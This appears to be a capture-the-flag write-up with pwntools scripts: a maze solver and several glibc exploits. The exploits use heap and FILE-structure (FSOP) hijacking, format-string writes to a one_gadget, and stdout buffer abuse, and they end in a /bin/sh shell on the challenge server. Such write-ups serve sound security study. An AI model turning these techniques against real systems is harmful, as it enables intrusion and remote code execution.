## Misc
### babymaze1
```python
#coding=utf-8
from pwn import*
import numpy as np
#context.log_level = 'DEBUG'
def Get_T(s):
	line = []
	tmp = []
	j = 0
	k = 0
	start = []
	end = []
	data = ''
	for i in range(s):
		data += p.recvline()
	data = data.replace('\x23','\x00')  # black 
	data = data.replace('\x20','\x01')  # white
	data = data.replace('\x24','\x03') # flag
	data = data.replace('\x2A','\x02')
	for i in data:
		if(i == '\n'):
			line.append(tmp)
			tmp = []
			j += 1
			k = 0
		elif(i == '\x02'):
			start.append(j)
			start.append(k)
			k += 1
			tmp.append(ord(i))
		elif(i == '\x03'):
			end.append(j)
			end.append(k)
			k += 1
			tmp.append(ord(i))
		else:
			k += 1
			tmp.append(ord(i))
	return line,start,end
###############################
def up(location):
    # 到达了数组顶端
    if location[0] == 0:
        return False
    else:
        new_location = [location[0] - 1, location[1]]
 
        # 走过的路不再走
        if new_location in history_path:
            return False
        # 遇到墙不走
        elif maze[new_location[0]][new_location[1]] == 0:
            return False
        else:
            lookup_path.append(new_location)
            history_path.append(new_location)
            return True
 
 
def down(location):
    # 遇到迷宫最下方的时候，不能继续往下走
    if location[0] == len(maze) - 1:
        return False
    else:
        new_location = [location[0] + 1, location[1]]
        # 走过的路不再走
        if new_location in history_path:
            return False
        # 遇到墙不走
        elif maze[new_location[0]][new_location[1]] == 0:
            return False
        else:
            history_path.append(new_location)
            lookup_path.append(new_location)
            return True
 
 
def left(location):
    # 遇到迷宫最左边，不能继续往左走
    if location[1] == 0:
        return False
    else:
        new_location = [location[0], location[1] - 1]
        # 走过的路不再走
        if new_location in history_path:
            return False
        # 遇到墙不走
        elif maze[new_location[0]][new_location[1]] == 0:
            return False
        else:
            history_path.append(new_location)
            lookup_path.append(new_location)
            return True
 
 
def right(location):
    # 遇到迷宫最右边，不能继续向右移动
    if location[1] == len(maze[0]) - 1:
        return False
    else:
        new_location = [location[0], location[1] + 1]
        # 走过的路不再走
        if new_location in history_path:
            return False
        # 遇到墙不走
        elif maze[new_location[0]][new_location[1]] == 0:
            return False
        else:
            history_path.append(new_location)
            lookup_path.append(new_location)
            return True
def get_line(path):
	p = ''
	for i in range(len(path)-1):
		tmp1 = path[i]
		tmp2 = path[i + 1]
		if tmp1[0] > tmp2[0]:
			p += 'w'
		elif tmp1[0] < tmp2[0]:
			p += 's'
		if tmp1[1] > tmp2[1]:
			p += 'a'
		elif tmp1[1] < tmp2[1]:
			p += 'd'
	return p
	

p = remote('182.92.203.154',11001)
p.sendlineafter('Please press any key to start.','FMYY')

for i in range(5):
	log.info('LEVEL' + str(i+1))
	maze,start,end = Get_T(11 + i*10)
	lookup_path = []
	history_path = []
	lookup_path.append(start)
	history_path.append(start)
	while lookup_path[-1] != end:
		now = lookup_path[-1]
		if up(now) or down(now) or left(now) or right(now):
			continue
		lookup_path.pop()
	#print("Final:", lookup_path)
	path = get_line(lookup_path)
	#log.info('PATH:\t' + path)
	p.sendlineafter('> ',path)
	p.recvuntil('your win\n')

p.interactive()

```

## Pwn
### wind_farm_panel
```python
from pwn import*
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new(index,size,content):
	menu(1)
	p.sendlineafter(': ',str(index))
	p.sendlineafter('turbine: ',str(size))
	p.sendafter('name: ',content)
def show(index):
	menu(2)
	p.sendlineafter('viewed: ',str(index))
def edit(index,content):
	menu(3)
	p.sendlineafter('turbine: ',str(index))
	p.sendafter('input: ',content)
p = process('./main')
p = remote('182.92.203.154',28452)
libc =ELF('./libc-2.23.so')
new(0,0x200,'\x00'*0x208 + p32(0xDF1))
new(1,0x1000,'FMYY')
new(2,0x100,'\xA0')
show(2)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook']  - 0x70 - 0x620
log.info('LIBC:\t' + hex(libc_base))

IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x3C37A0
fake_IO_FILE  = p64(0) + p64(0x61)
fake_IO_FILE += p64(0) + p64(IO_list_all - 0x10)
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(libc_base + libc.search('/bin/sh').next())
fake_IO_FILE  = fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8)
fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['system'])
new(3,0x200,'\x00'*0x200 + fake_IO_FILE)
menu(1)
p.sendline('4')
p.sendline(str(0x200))
p.interactive()
```


### shell
```python
from pwn import*
context.log_level = 'DEBUG'
p = process('./main')
p = remote('182.92.203.154',35264)
libc =ELF('./libc-2.23.so')
p.sendline('fg %12$p')
p.recvuntil('0x')
proc_base = int(p.recv(12),16)  - 0x203169
log.info('Proc:\t' + hex(proc_base))



payload  = 'fg %174$s'
payload  = payload.ljust(0x10,'U')
payload += p64(proc_base + 0x2030B8)
p.sendline(payload)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['getopt']
log.info('LIBC:\t' + hex(libc_base))


payload  = 'fg %' + str((libc_base + 0x45226)&0xFF) + 'c%174$hhn'
payload  = payload.ljust(0x10,'U')
payload += p64(proc_base + 0x2030C8)
p.sendline(payload )

sleep(0.2)
payload  = 'fg %' + str(((libc_base + 0x45226)>>8)&0xFF) + 'c%174$hhn'
payload  = payload.ljust(0x10,'U')
payload += p64(proc_base + 0x2030C8 + 1)
p.sendline(payload )

sleep(0.2)
payload  = 'fg %' + str(((libc_base + 0x45226)>>16)&0xFF) + 'c%174$hhn'
payload  = payload.ljust(0x10,'U')
payload += p64(proc_base + 0x2030C8 + 2)
p.sendline(payload)

sleep(0.2)
payload  = 'fg %' + str(((libc_base + 0x45226)>>24)&0xFF) + 'c%174$hhn'
payload  = payload.ljust(0x10,'U')
payload += p64(proc_base + 0x2030C8 + 3)
p.sendline(payload)

sleep(0.2)
payload  = 'fg %' + str(((libc_base + 0x45226)>>32)&0xFF) + 'c%174$hhn'
payload  = payload.ljust(0x10,'U')
payload += p64(proc_base + 0x2030C8 + 4)
p.sendline(payload)

sleep(0.2)
payload  = 'fg %' + str(((libc_base + 0x45226)>>40)&0xFF) + 'c%174$hhn'
payload  = payload.ljust(0x10,'U')
payload += p64(proc_base + 0x2030C8 + 5)
p.sendline(payload)
p.sendline('quit')
p.interactive()
```
### Power_System
第一次知道strncmp依旧不是按照n来比较的,还是会\0截断  
爆破脚本
```python
# coding=utf-8
from pwn import*
from Crypto.Util.number import *
import string
import hashlib
import random
s = '%p%p%pLC:%p'
def passwd():
	def F(code):
		hashresult=hashlib.sha256(s + code).digest().encode('hex').upper()
		return hashresult.startswith('E85000')

	prefix = util.iters.mbruteforce(F, string.ascii_letters + string.digits, 4, 'fixed')
	return prefix
print passwd()
```
#### exp1
思路来自havik师傅,劫持stdout的缓冲区到bss,让缓冲区的字节修改0x7008位置的指针,实现任意写
```python
from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def adjust(index,size,content):
	menu(2)
	p.sendlineafter('the power: ',str(index))
	p.sendlineafter('size: ',str(size))
	p.sendafter('staff: ',content)
def delete(index):
	menu(3)
	p.sendlineafter('power: ',str(index))
def login():
	menu(2)
	p.sendlineafter('account :','QAQ')
	p.sendafter('password :','rCLQ\n')
p = process('./main')
p = remote('182.92.203.154',15268)
libc =ELF('./libc-2.29.so')
login()
adjust(-6,0,'\x00'*0x17 + '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_'] - 0xD00
log.info('LIBC:\t' + hex(libc_base))
environ = libc_base + libc.sym['environ']
system = libc_base + libc.sym['system']
IO_stdout_off = libc_base + libc.sym['_IO_2_1_stdout_'] + 131
adjust(-6,0,'\x00'*0x18 + p64(environ) + p64(environ + 8) + p64(environ + 8) + p64(IO_stdout_off) + p64(IO_stdout_off + 1)  + '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))

stack = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00'))
log.info('Stack:\t' + hex(stack))
leak_address = stack - 0x160
adjust(-6,0,'\x00'*0x18 + p64(leak_address) + p64(leak_address + 8) + p64(leak_address + 8) + p64(IO_stdout_off) + p64(IO_stdout_off + 1)  + '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))

proc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x7040
log.info('Proc:\t' + hex(proc_base))

leak_address = proc_base + 0x7000
adjust(-6,0,p64(leak_address)*6 +  p64(leak_address + 2) + p64(leak_address + 9)+ '\n')
p.sendline('2')
p.sendline('-2')
p.sendline('0')
p.sendline('\x00'*0xD8 + p64(0xFBAD1800))

IO_overflow = libc_base + libc.sym['_IO_file_jumps'] + 0x18
adjust(-13,0,p64(1) + p64(IO_overflow - 8) + '\n')
adjust(1,0,p64(libc_base + 0x106EF8) + '\n')
p.interactive()
```

#### exp2
走题目所给后门,2.24下的fsop 会调用free_buffer指针,而2.29改为调用free函数
```python
from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def adjust(index,size,content):
	menu(2)
	p.sendlineafter('the power: ',str(index))
	p.sendlineafter('size: ',str(size))
	p.sendafter('staff: ',content)
def delete(index):
	menu(3)
	p.sendlineafter('power: ',str(index))
def login():
	menu(2)
	p.sendlineafter('account :','QAQ')
	p.sendafter('password :','%p%p%pLC:%pbMUK\n')
p = process('./main')
#p = remote('182.92.203.154',15268)
libc =ELF('./libc-2.29.so')
login()
p.recvuntil('LC:')
libc_base = int(p.recv(14),16)  - 0x1EC5C0
log.info('LIBC:\t' + hex(libc_base))

system = libc_base + libc.sym['system']

IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x1E6620
fake_IO_FILE  = '\x00'*0x18
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(libc_base + libc.search('/bin/sh').next())
fake_IO_FILE  = fake_IO_FILE.ljust(0xD0,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8) + p64(0xFBAD2887)


adjust(-2,0,fake_IO_FILE)
p.sendline('FMYY')
menu(4)
p.sendlineafter('__free_hook',p64(system))
p.interactive()
```
